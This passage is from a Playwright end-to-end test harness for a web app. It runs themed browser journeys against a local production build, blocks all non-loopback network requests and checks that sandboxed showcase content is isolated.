
    await route.abort();
  });

  const page = await context.newPage();

  page.setDefaultTimeout(20_000);

  const errors = trackErrors(page, { ignoreCsp: true });
  const completed = [];

  try {
    await journey(theme, "showcase render and input at 320/1024/1440", page, errors, async () => {
      await showcaseRenderJourney(page, baseUrl, theme);
    });
    completed.push("showcase render and input at 320/1024/1440");

    await journey(theme, "showcase hostile isolation and teardown", page, errors, async () => {
      await showcaseHostileJourney(page, baseUrl);
    });
    completed.push("showcase hostile isolation and teardown");

    return { theme, completed };
  } finally {
    await context.close();
  }
}

async function runTheme(browser, baseUrl, theme, account) {
  const context = await browser.newContext({
    viewport: MOBILE,
    colorScheme: theme,
    deviceScaleFactor: 1,
  });

  await context.addInitScript((value) => {
    try {
      // next-themes defaults its storage key to `theme`; keep the legacy
      // `next-themes` key too so the harness is explicit about the resolved key.
      window.localStorage.setItem("theme", value);
      window.localStorage.setItem("next-themes", value);
    } catch {
      // Cross-origin embeds (for example the video iframe) deny storage.
    }
  }, theme);
  await context.route("**/*", async (route) => {
    const url = new URL(route.request().url());
    const loopback =
      url.hostname === "127.0.0.1" ||
      url.hostname === "localhost" ||
      url.hostname === "::1";

    if (loopback) {
      // Vercel injects this telemetry asset at the edge. A local production
      // build has no such route, so serve an empty script rather than letting
      // infrastructure noise count as an application console error.
      if (url.pathname.startsWith("/_vercel/")) {
        await route.fulfill({
          status: 200,
          contentType: "application/javascript",
          body: "",
        });

        return;
      }

      await route.continue();

      return;
    }

    await route.abort();
  });

  const page = await context.newPage();

  page.setDefaultTimeout(20_000);

  const errors = trackErrors(page);
  const completed = [];

  try {
    await journey(theme, "mobile sign-in, key reveal and top-up entry", page, errors, async () => {
      await signInAtMobile(page, baseUrl, account);
      await assertVisibleFocus(page);
      await keyAndTopup(page);
      await assertNoHorizontalOverflow(page);
      await assertTheme(page, theme);
    });
    completed.push("mobile sign-in, key reveal and top-up entry");

    await page.setViewportSize(DESKTOP);

    await journey(theme, "palette open/select/Escape", page, errors, async () => {
      await paletteJourney(page, baseUrl);
    });
    completed.push("palette open/select/Escape");

    await journey(theme, "video dialog Escape and focus return", page, errors, async () => {
      await videoJourney(page, baseUrl);
    });
    completed.push("video dialog Escape and focus return");

    await journey(theme, "reply", page, errors, async () => {
      await replyJourney(page, baseUrl, theme);
    });
    completed.push("reply");

    await journey(theme, "reaction", page, errors, async () => {
      await reactionJourney(page, baseUrl);
    });
    completed.push("reaction");

    await journey(theme, "catalog filter and Back", page, errors, async () => {
      await catalogJourney(page, baseUrl);
    });
    completed.push("catalog filter and Back");

    await journey(theme, "model coverage rows and empty state", page, errors, async () => {
      await coverageJourney(page, baseUrl, theme);
    });
    completed.push("model coverage rows and empty state");

    return { theme, completed };
  } finally {
    await context.close();
  }
}

async function main() {
  assert.ok(
    existsSync(BUILD_MARKER),
    "browser-matrix: production build missing; run `npm run build` first",
  );

  const workspace = await createTempWorkspace();
  const serverPort = await reservePort();
  const databasePort = await reservePort();
  const mock = await startMockUpstream({ expectedKey: PROVIDER_KEY });
  const databaseServer = await startDatabaseServer({
    directory: workspace.databaseDirectory,
    port: databasePort,
    connectionString: process.env.HTTP_TEST_DATABASE_URL?.trim(),
  });
  let server = null;
  let database = null;
  let browser = null;

  try {
    server = startNextServer({
      repo: REPO,
      port: serverPort,
      databaseUrl: databaseServer.connectionString,
      env: {
        ADMIN_PASSWORD,
        ADMIN_SESSION_SECRET: ADMIN_SECRET,
        CARD_TOPUPS_ENABLED: "true",
        CONTENT_ENABLED: "true",
        CONTENT_INGEST_ENABLED: "false",
        VISUAL_BUILDS_ENABLED: SHOWCASE_ONLY ? "true" : "false",
        NEXT_PUBLIC_SITE_URL: `http://127.0.0.1:${serverPort}`,
        GATEWAY_DISPOSABLE_START: "yes",
        PAID_KEY_RPM: "60",
        TRIAL_ENABLED: "false",
        STRIPE_SECRET_KEY: "sk_test_browser_matrix_placeholder",
        STRIPE_WEBHOOK_SECRET: "whsec_browser_matrix_placeholder",
        PROVIDER_KEY: "",
        COMMANDCODE_API_KEY: "",
        ARTIFICIAL_ANALYSIS_API_KEY: "",
        HTTP_SUITE_PROVIDER_KEY: PROVIDER_KEY,
      },
    });

    const baseUrl = `http://127.0.0.1:${serverPort}`;

    await waitForServer({ baseUrl, child: server.child, logs: server.logs });

    database = await openDatabase(databaseServer.connectionString);
    await waitForSchema(database);
    await seedCatalog(database, { mockBaseUrl: mock.baseUrl });

    let accounts = [];

    if (SHOWCASE_ONLY) {
      await seedPublishedBuild(database);
      await seedHostileBuild(database, baseUrl);
    } else {
      await waitForContentSchema(database);

      const commenter = await signup(
        baseUrl,
        "browser-commenter@example.test",
        COMMENT_AUTHOR,
      );

      await seedContent(database, commenter.id);
      await seedCoverage(database);

      accounts = [
        {
          theme: "light",
          email: "browser-light@example.test",
          name: "Browser Light",
        },
        {
          theme: "dark",
          email: "browser-dark@example.test",
          name: "Browser Dark",
        },
      ];

      for (const account of accounts) {
        await signup(baseUrl, account.email, account.name);
      }
    }

    const launched = await launchBrowser();

    browser = launched.browser;

    const results = [];

    if (SHOWCASE_ONLY) {
      for (const theme of ["light", "dark"]) {
        results.push(await runShowcaseTheme(browser, baseUrl, theme));
      }
    } else {
      for (const account of accounts) {
        results.push(await runTheme(browser, baseUrl, account.theme, account));
      }
    }

    const buildId = await import("node:fs/promises").then(({ readFile }) =>
      readFile(BUILD_MARKER, "utf8"),
    );
    const result = {
      schema: 1,
      generatedAt: new Date().toISOString(),
      baseUrl,
      buildId: buildId.trim(),
      mode: SHOWCASE_ONLY ? "showcase" : "full",
      showcase: SHOWCASE_ONLY
        ? {
            widths: [320, 1024, 1440],
            webglPixels: true,
            input: "keyboard, touch and pointer delivered",
            isolation:
              "opaque origin; parent DOM, cookie, storage, popup, admin API and outbound fetch blocked",
            teardown: true,
          }
        : null,
      themes: results,
      checks: results.reduce(
        (total, entry) => total + entry.completed.length,
        0,
      ),
      browser: launched.label,
    };

    await mkdir(ARTIFACT_DIR, { recursive: true });
    await writeFile(ARTIFACT_JSON, `${JSON.stringify(result, null, 2)}\n`);

    console.log(
      `browser-matrix: ${result.checks} journey checks PASS ` +
        `(build ${result.buildId})`,
    );
    console.log(`browser-matrix: receipt ${ARTIFACT_JSON}`);
  } catch (error) {
    if (server) {
      console.error(`browser-matrix: server log tail\n${logTail(server.logs)}`);
    }

    throw error;
  } finally {
    await browser?.close();
    await database?.close();
    await databaseServer.close();
    await mock.close();
    if (server) await stopNextServer(server.child);
    await workspace.remove();
  }
}

main().catch((error) => {
  console.error(
    `browser-matrix FAIL: ${error instanceof Error ? error.message : String(error)}`,
  );
  process.exitCode = 1;
});
